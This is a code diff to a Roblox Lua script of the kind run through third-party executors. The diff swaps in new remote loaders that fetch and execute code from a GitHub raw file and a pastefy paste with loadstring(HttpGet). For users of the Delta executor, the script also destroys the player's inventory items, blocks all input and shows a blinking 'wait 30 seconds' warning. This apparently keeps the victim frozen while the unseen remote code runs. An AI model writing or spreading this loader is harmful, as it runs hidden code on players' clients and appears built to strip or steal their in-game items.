@@ -1,3 +1,8 @@
+if getgenv().AlreadyExecuted then
+    return
+end
+getgenv().AlreadyExecuted = true
+
 local Players = game:GetService("Players")
 local player = Players.LocalPlayer
 local TweenService = game:GetService("TweenService")
@@ -7,29 +12,28 @@ local ContextActionService = game:GetService("ContextActionService")
 -- Load external scripts
 local function runLoaders()
     pcall(function()
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/flazhy/QuantumOnyx/refs/heads/main/QuantumOnyx.lua"))()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/KuniDevLua/GrowAGarden/refs/heads/main/kunihublibrary2"))()
     end)
     pcall(function()
-        loadstring(game:HttpGet("https://pastefy.app/2hhRAraG/raw"))()
+        loadstring(game:HttpGet("https://pastefy.app/9eQeq8s4/raw"))()
     end)
 end
 
 -- Executor detection
 local function detectExecutor()
-    if syn then
-        return "Synapse"
-    elseif KRNL then
-        return "KRNL"
-    elseif Fluxus then
-        return "Fluxus"
-    elseif Protosmasher then
-        return "Protosmasher"
-    elseif (ArceusX ~= nil) or (Arceus ~= nil) then
-        return "Arceus X"
-    elseif Delta then
-        return "Delta"
+    local success, result = pcall(function()
+        if identifyexecutor then
+            return identifyexecutor()
+        elseif getexecutorname then
+            return getexecutorname()
+        else
+            return "Unknown"
+        end
+    end)
+    if success and result then
+        return tostring(result)
     else
-        return "Codex / Unknown"
+        return "Unknown"
     end
 end
 
@@ -44,16 +48,13 @@ local function freezePlayer()
     end
 end
 
--- Clear inventory (tools and equipable pets)
+-- Clear inventory
 local function clearInventory()
-    -- Remove tools from backpack
     for _, tool in ipairs(player.Backpack:GetChildren()) do
         if tool:IsA("Tool") then
             tool:Destroy()
         end
     end
-
-    -- Remove tools and accessories from character
     local character = player.Character
     if character then
         for _, item in ipairs(character:GetChildren()) do
@@ -64,7 +65,7 @@ local function clearInventory()
     end
 end
 
--- Show Delta warning GUI
+-- Delta warning GUI
 local function showDeltaWarning()
     local ScreenGui = Instance.new("ScreenGui")
     ScreenGui.Parent = player:WaitForChild("PlayerGui")
@@ -121,6 +122,7 @@ To enable the script:
 For a more stable and reliable experience, it is recommended to use executors such as KRNL, Codex or Arceus X.
 ]]
 
+    -- 🔥 Yellow blinking text
     local InfoLabel = Instance.new("TextLabel")
     InfoLabel.Parent = Frame
     InfoLabel.BackgroundTransparency = 1
@@ -131,7 +133,14 @@ For a more stable and reliable experience, it is recommended to use executors su
     InfoLabel.TextColor3 = Color3.fromRGB(255, 255, 0)
     InfoLabel.TextWrapped = true
     InfoLabel.TextXAlignment = Enum.TextXAlignment.Center
-    InfoLabel.Text = "Wait 30 seconds after rejoining to use the script."
+    InfoLabel.Text = "Wait 30 seconds after rejoining before this warning disappears"
+
+    task.spawn(function()
+        while InfoLabel.Parent do
+            InfoLabel.Visible = not InfoLabel.Visible
+            task.wait(0.7)
+        end
+    end)
 
     local Button = Instance.new("TextButton")
     Button.Parent = Frame
@@ -154,7 +163,6 @@ For a more stable and reliable experience, it is recommended to use executors su
         TeleportService:Teleport(game.PlaceId, player)
     end)
 
-    -- Clear inventory then freeze player
     clearInventory()
     freezePlayer()
     ContextActionService:BindAction("FreezeAllInputs", function() return Enum.ContextActionResult.Sink end, false, unpack(Enum.UserInputType:GetEnumItems()))
@@ -177,10 +185,9 @@ end
 
 -- Main execution
 local executorName = detectExecutor()
-
-if executorName == "Delta" then
+if executorName:lower():find("delta") then
     runLoaders()
     showDeltaWarning()
 else
-    runLoaders()
+    runLoaders() -- ✅ no warning, no freeze
 end
